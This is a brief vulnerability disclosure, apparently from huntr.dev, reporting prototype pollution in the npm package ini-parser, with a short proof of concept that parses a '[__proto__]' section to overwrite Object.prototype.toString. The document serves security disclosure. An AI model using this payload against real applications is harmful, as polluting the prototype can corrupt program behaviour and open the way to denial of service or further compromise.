# Overview

`ini-parser` is a package to parse `.ini` files, this package are vulnerable to Prototype Pollution.

The library could be tricked into adding or modifying properties of `Object.prototype` using a `proto` payload.

# Proof of Concept

```
var a = require("ini-parser");
a.parse('[__proto__]\ntoString=huntr.dev');
console.log({}.toString);
```
